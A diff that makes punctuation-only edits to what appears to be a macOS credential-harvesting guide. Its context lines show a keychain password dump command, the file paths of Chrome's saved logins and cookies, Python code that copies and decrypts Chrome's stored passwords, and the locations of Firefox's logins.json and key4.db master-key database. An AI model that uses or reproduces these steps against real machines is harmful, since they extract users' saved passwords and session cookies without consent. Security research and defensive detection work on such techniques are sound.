@@ -33,10 +33,10 @@ security find-internet-password -s "example.com" -w 2>/dev/null
 
 ### Google Chrome
 ```bash
-# Login Data (SQLite — passwords encrypted with Keychain "Chrome Safe Storage" key)
+# Login Data (SQLite - passwords encrypted with Keychain "Chrome Safe Storage" key)
 ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data
 
-# Cookies (SQLite — encrypted with same key)
+# Cookies (SQLite - encrypted with same key)
 ~/Library/Application\ Support/Google/Chrome/Default/Cookies
 
 # History
@@ -83,7 +83,7 @@ def decrypt_chrome_password(encrypted):
         return decrypted[:-decrypted[-1]].decode('utf-8')
     return ''
 
-# Read Login Data (copy first — Chrome locks the file)
+# Read Login Data (copy first - Chrome locks the file)
 import shutil
 shutil.copy2(
     f'{os.path.expanduser("~")}/Library/Application Support/Google/Chrome/Default/Login Data',
@@ -100,7 +100,7 @@ for row in conn.execute('SELECT origin_url, username_value, password_value FROM 
 
 ### Firefox
 ```bash
-# Logins (JSON — encrypted with key from key4.db)
+# Logins (JSON - encrypted with key from key4.db)
 ~/Library/Application\ Support/Firefox/Profiles/*.default-release/logins.json
 
 # Key database (contains the master key for decryption)
